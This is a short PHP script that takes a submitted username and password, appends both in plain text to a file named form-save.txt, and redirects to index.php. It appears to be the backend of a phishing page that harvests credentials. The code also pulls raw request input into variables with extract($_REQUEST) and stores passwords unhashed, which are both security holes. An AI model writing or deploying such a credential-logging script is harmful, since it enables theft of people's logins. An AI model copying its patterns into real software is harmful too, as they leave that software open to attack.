<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"Name :");
    fwrite($file, $username ."\n");
   
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: index.php");
 ?>
